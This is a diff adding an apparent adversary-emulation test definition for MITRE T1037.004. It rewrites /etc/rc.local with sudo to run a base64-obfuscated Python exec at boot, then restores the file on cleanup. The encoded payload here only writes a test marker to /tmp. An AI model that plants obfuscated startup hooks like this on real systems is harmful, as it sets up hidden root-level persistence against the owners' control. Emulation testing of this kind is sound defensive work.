@@ -1,0 +1,21 @@
+- description: 'Modify rc.local
+
+    '
+  id: 77f61dda65d9eefb8f8a08321e1c00c8
+  name: rc.local
+  platforms:
+    linux:
+      sh:
+        cleanup: origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then
+          sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm
+          $origfilename;fi
+        command: filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else
+          sudo cp $filename /etc/rc.local.original;fi; printf '%s\n' '#!/bin/bash'
+          | sudo tee /etc/rc.local; echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\""
+          | sudo tee -a /etc/rc.local; printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local;
+          sudo chmod +x /etc/rc.local
+        payloads: []
+  tactic: multiple
+  technique:
+    attack_id: T1037.004
+    name: 'Boot or Logon Initialization Scripts: Rc.common'
